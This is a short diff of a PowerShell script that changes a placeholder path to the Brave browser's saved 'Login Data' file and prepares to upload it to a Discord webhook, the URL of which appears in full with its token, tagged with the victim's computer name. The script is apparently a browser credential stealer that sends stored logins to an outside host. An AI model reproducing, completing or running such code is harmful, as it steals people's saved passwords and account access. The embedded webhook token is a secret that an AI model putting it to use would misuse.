@@ -1,5 +1,5 @@
 $webhookUrl = "https://discord.com/api/webhooks/1372616054664073320/UnxIbbbhdjldR18Xgsu05fywZn_cY6dRNQBdG_kD3qtlS4cfqdXOY3pQYt-J5LxTRH7B"
-$filePath = "C:\Path\To\Your\File.txt"
+$filePath = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
 $fileName = [System.IO.Path]::GetFileName($filePath)
 $message = "**Login Data** of Brave Browser in [$env:COMPUTERNAME]"
 $boundary = [System.Guid]::NewGuid().ToString()
